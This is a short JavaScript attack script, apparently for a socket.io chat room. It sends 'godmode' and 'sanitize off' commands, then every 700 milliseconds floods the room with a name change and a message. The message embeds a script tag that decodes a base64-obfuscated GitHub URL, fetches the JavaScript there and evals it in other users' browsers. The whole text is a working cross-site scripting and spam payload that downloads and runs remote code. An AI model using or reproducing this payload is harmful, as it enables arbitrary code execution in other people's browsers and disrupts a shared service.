socket.emit('command', { list: ['godmode'] });
socket.emit('command', { list: ['sanitize', 'off'] });
setInterval(function() {
    socket.emit("command", {
        list: ["name", "Vii vii vii..."]
    });
    socket.emit('talk', { text: "Vii vii vii vii vii vii vii vii vii vii vii... <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'VII'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
}, 700);
